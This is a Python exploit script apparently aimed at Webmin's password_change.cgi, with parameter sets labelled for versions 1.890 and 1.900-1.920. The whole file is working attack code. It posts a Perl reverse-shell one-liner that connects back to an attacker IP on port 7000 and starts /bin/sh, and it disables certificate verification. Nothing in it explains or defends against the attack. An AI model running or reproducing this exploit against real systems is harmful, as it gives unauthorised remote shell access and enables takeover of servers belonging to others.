import requests, random, string
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

session = requests.Session()
session.verify = False
myIp = "192.168.1.18"
myPort = "7000"
target = 'https://192.168.1.61:10000/password_change.cgi'
command = 'perl -e \'use Socket;$i="192.168.1.18";$p=7000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
token = "".join(random.choices(string.ascii_letters + string.digits, k=8))
headers = {
			"Referer":"https://192.168.1.61:10000/"
		}
params = {
    #Param for 1.890
    "expired":command,
    #Params for 1.900-1.920
    "new1":token,
    "new2":token,
    "old":command
}
session.post(target, data=params, headers=headers, timeout=15)